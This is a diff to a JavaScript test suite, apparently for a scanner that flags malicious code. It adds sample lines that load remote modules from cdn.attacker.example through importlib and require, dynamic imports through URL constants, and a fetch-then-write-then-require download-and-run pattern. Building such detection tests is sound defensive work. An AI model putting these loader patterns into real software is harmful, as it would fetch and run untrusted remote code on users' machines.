@@ -225,6 +225,24 @@ describe('malicious fixture attack lines', () => {
         `const next = count++ / 2; const slash3 = "/"; const incMod = require('https://cdn.attacker.example/inc.js');`,
         `const ret = obj.return / 2; const slash4 = "/"; const retMod = require('https://cdn.attacker.example/ret.js');`,
         "formatter = importlib.import_module('https://cdn.attacker.example/formatter.py')",
+        "raw_formatter = importlib.import_module(r'https://cdn.attacker.example/raw.py')",
+        "bytes_formatter = importlib.import_module(bR'https://cdn.attacker.example/bytes.py')",
+        'format_formatter = importlib.import_module(F"https://cdn.attacker.example/{importlib.__name__}.py")',
+        "unicode_formatter = importlib.import_module(U'https://cdn.attacker.example/unicode.py')",
+        // A URL that a constant holds, also through a template or another constant.
+        'const stageModule = await import(STAGE_URL);',
+        'const theme = await import(`${CDN_BASE}/theme.js`);',
+        "const icons = await import(CDN_BASE + '/icons.js');",
+        'const plugin = await import(/* @vite-ignore */ PLUGIN_URL);',
+        'const remoteRules = require(RULES_URL);',
+        // A module that the code downloads to a file and then loads.
+        "fetch(url).then(r => r.text()).then(t => fs.writeFileSync('x.js', t)); require('./x.js');",
+        "const format = require('./lib/format');",
+        'import net_helper',
+        "spec = importlib.util.spec_from_file_location('stage_two', 'stage_two.py')",
+        "runpy.run_path('/tmp/stage_three.py')",
+        'import httpimport',
+        'from httpimport import load as load_remote',
       ],
     },
     {
@@ -703,6 +721,18 @@ describe('rule cost on masked content', () => {
       shape: 'nested template literals',
       file: 'templates.js',
       content: `x = ${'`${'.repeat(10_000)}${'}`'.repeat(10_000)};\n`,
+    },
+    // Each loader reads the nearest declaration of its name, and a curl command splits into
+    // file names.
+    {
+      shape: 'many declarations of one name',
+      file: 'names.js',
+      content: `let e = 'https://x.example/a.js';\n${'let e = 1; import(e);\n'.repeat(20_000)}`,
+    },
+    {
+      shape: 'a long curl argument',
+      file: 'curl.py',
+      content: `run('curl ${'a/'.repeat(50_000)}')\nimport a\n`,
     },
   ];
 
